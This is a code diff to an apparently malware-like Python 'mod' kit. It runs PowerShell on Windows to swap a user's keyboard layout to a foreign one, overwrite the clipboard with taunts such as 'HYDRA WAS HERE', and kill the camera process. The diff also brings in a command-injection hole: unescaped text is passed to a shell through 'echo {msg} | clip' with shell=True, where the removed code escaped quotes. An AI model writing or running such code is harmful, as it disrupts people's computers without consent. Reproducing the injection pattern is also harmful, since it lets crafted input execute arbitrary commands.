@@ -293,19 +293,30 @@ Get-Process -Name "WindowsCamera" -ErrorAction SilentlyContinue | Stop-Process -
 
 @register("keyboard_swap")
 def mod_keyboard_swap():
-    """Swap keyboard layout to a random one (user can switch back)."""
+    """Swap keyboard layout. Detects current layout, picks something different."""
     _run_ps("""
+$current = Get-WinUserLanguageList | Select -First 1 -ExpandProperty LanguageTag
+# Try German, French, or Arabic — pick one different from current
+$options = @('de-DE','fr-FR','ar-SA','ru-RU','ja-JP')
+$target = $options | Where-Object {$_ -ne $current} | Select -First 1
+if(-not $target){$target = 'ar-SA'}
 $list = Get-WinUserLanguageList
 $list.Clear()
-$list.Add("en-US")
+$list.Add($target)
 Set-WinUserLanguageList -LanguageList $list -Force
+# Restore original after 30 seconds
+Start-Sleep -Seconds 30
+$list2 = Get-WinUserLanguageList
+$list2.Clear()
+$list2.Add($current)
+Set-WinUserLanguageList -LanguageList $list2 -Force
 """)
-    return "Keyboard layout changed to EN-US"
+    return "Keyboard layout swapped + auto-restore in 30s"
 
 
 @register("clipboard")
 def mod_clipboard(msg: str = None):
-    """Replace clipboard content."""
+    """Replace clipboard content via clip.exe (thread-safe)."""
     if not msg:
         garbage = [
             "HYDRA WAS HERE",
@@ -314,10 +325,16 @@ def mod_clipboard(msg: str = None):
         ]
         msg = random.choice(garbage)
 
-    _run_ps(f"""
-Add-Type -AssemblyName System.Windows.Forms
-[Windows.Forms.Clipboard]::SetText('{msg.replace("'", "''")}')
-""")
+    # Use clip.exe — no STA threading requirement
+    try:
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        subprocess.run(
+            f'echo {msg} | clip',
+            startupinfo=si, shell=True, timeout=5
+        )
+    except:
+        pass
     return f"Clipboard replaced: {msg}"
 
 
